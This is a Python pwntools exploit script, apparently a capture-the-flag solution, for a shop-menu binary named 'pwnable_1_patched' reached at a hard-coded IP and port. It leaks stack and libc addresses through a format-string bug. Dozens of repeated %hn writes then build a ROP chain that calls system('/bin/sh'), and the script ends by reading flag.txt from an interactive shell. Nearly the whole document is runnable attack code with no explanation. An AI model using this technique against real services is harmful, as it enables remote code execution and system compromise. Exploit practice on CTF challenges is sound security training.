#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 13331
HOST = "103.197.184.48"
exe = context.binary = ELF('./pwnable_1_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            brva 0x0000000000001BED
            brva 0x0000000000001BD5
            brva 0x00000000000015C6
            brva 0x0000000000001AF7
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def buy(fruit, quantity, choice, data=b'abcd'):
	p.sendlineafter(b'Input:', str(1))
	p.sendlineafter(b'(1)?', str(fruit))
	p.sendlineafter(b'quantity:', str(quantity))
	p.sendlineafter(b'address? ', choice)
	p.sendline(data)

def show():
	p.sendlineafter(b'Input:', str(2))

def change_label(idx, data):
	p.sendlineafter(b'Input:', str(3))
	p.sendlineafter(b'label:', str(idx))
	p.sendlineafter(b'label:', data)

def change_address(idx, data):
	p.sendlineafter(b'Input:', str(4))
	p.sendlineafter(b'address:', str(idx))
	p.sendlineafter(b'address:', data)

# VARIABLE


# PAYLOAD
payload = b'\0'*0x40
payload += b'%10$p%15$p'
buy(1, -1, b'Y', payload)
payload = b'\0'*0xa
change_label(1, payload)
show()
p.recvuntil(b'65531|')
leak = p.recvuntil(b'\n', drop=True).split(b'0x')
stack_leak = int(leak[1], 16)
libc_leak = int(leak[2], 16)
log.info("Stack leak: " + hex(stack_leak))
libc.address = libc_leak - 0x29d90
log.info("Libc base: " + hex(libc.address))
pop_rdi = 0x000000000002a3e5 + libc.address
ret = pop_rdi + 1
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))

# pop_rdi
save_rip = stack_leak + 0x8
payload = b'\0'*0x40 + f'%{save_rip & 0xffff}c%19$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 2
payload = b'\0'*0xa
change_label(2, payload)
show()

payload = b'\0'*0x40 + f'%{pop_rdi & 0xffff}c%49$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 3
payload = b'\0'*0xa
change_label(3, payload)
show()

# bin_sh
save_rip = stack_leak + 0x10
payload = b'\0'*0x40 + f'%{save_rip & 0xffff}c%19$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 4
payload = b'\0'*0xa
change_label(4, payload)
show()

payload = b'\0'*0x40 + f'%{bin_sh & 0xffff}c%49$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 5
payload = b'\0'*0xa
change_label(5, payload)
show()

save_rip += 2
payload = b'\0'*0x40 + f'%{save_rip & 0xffff}c%19$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 6
payload = b'\0'*0xa
change_label(6, payload)
show()

bin_sh = bin_sh >> 16
payload = b'\0'*0x40 + f'%{bin_sh & 0xffff}c%49$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 7
payload = b'\0'*0xa
change_label(7, payload)
show()

save_rip += 2
payload = b'\0'*0x40 + f'%{save_rip & 0xffff}c%19$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 8
payload = b'\0'*0xa
change_label(8, payload)
show()

bin_sh = bin_sh >> 16
payload = b'\0'*0x40 + f'%{bin_sh & 0xffff}c%49$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 9
payload = b'\0'*0xa
change_label(9, payload)
show()

save_rip = stack_leak + 0x18
payload = b'\0'*0x40 + f'%{save_rip & 0xffff}c%19$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 10
payload = b'\0'*0xa
change_label(10, payload)
show()

payload = b'\0'*0x40 + f'%{ret & 0xffff}c%49$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 11
payload = b'\0'*0xa
change_label(11, payload)
show()

save_rip += 2
payload = b'\0'*0x40 + f'%{save_rip & 0xffff}c%19$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 12
payload = b'\0'*0xa
change_label(12, payload)
show()

ret = ret >> 16
payload = b'\0'*0x40 + f'%{ret & 0xffff}c%49$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 13
payload = b'\0'*0xa
change_label(13, payload)
show()

save_rip += 2
payload = b'\0'*0x40 + f'%{save_rip & 0xffff}c%19$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 14
payload = b'\0'*0xa
change_label(14, payload)
show()

ret = ret >> 16
payload = b'\0'*0x40 + f'%{ret & 0xffff}c%49$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 15
payload = b'\0'*0xa
change_label(15, payload)
show()

save_rip = stack_leak + 0x20
payload = b'\0'*0x40 + f'%{save_rip & 0xffff}c%19$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 16
payload = b'\0'*0xa
change_label(16, payload)
show()

payload = b'\0'*0x40 + f'%{system & 0xffff}c%49$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 17
payload = b'\0'*0xa
change_label(17, payload)
show()

save_rip += 2
payload = b'\0'*0x40 + f'%{save_rip & 0xffff}c%19$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 18
payload = b'\0'*0xa
change_label(18, payload)
show()

system = system >> 16
payload = b'\0'*0x40 + f'%{system & 0xffff}c%49$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 19
payload = b'\0'*0xa
change_label(19, payload)
show()

save_rip += 2
payload = b'\0'*0x40 + f'%{save_rip & 0xffff}c%19$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 20
payload = b'\0'*0xa
change_label(20, payload)
show()

system = system >> 16
payload = b'\0'*0x40 + f'%{system & 0xffff}c%49$hn'.encode()
payload = payload.ljust(0x50, b'\0')
payload += p64(save_rip)
buy(1, -1, b'y', payload) # 21
payload = b'\0'*0xa
change_label(21, payload)
show()

p.sendlineafter(b'Input:', str(5))
p.sendline(b'cat flag.txt')

p.interactive()